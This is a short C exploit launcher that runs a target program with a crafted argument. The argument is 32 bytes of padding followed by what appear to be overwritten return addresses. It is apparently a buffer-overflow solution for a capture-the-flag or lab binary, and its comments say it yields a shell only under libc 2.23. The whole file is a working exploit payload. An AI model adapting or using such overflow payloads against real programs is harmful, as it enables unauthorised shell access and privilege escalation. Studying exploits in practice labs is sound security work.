#include <unistd.h>
#include <stdio.h>

int main(int argc, char** argv, char** envp)
{
    char* new_argv[3] = {argv[1], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjgaUT!kU8JVU8JVU", 0};
    // require ubuntu(libc-2.23.so) to get shell.
    // it doesn't work under kali20 (libc >= 2.31)
    execve(new_argv[0], new_argv, envp);
    perror("shouldn't return.");
    return 0;
}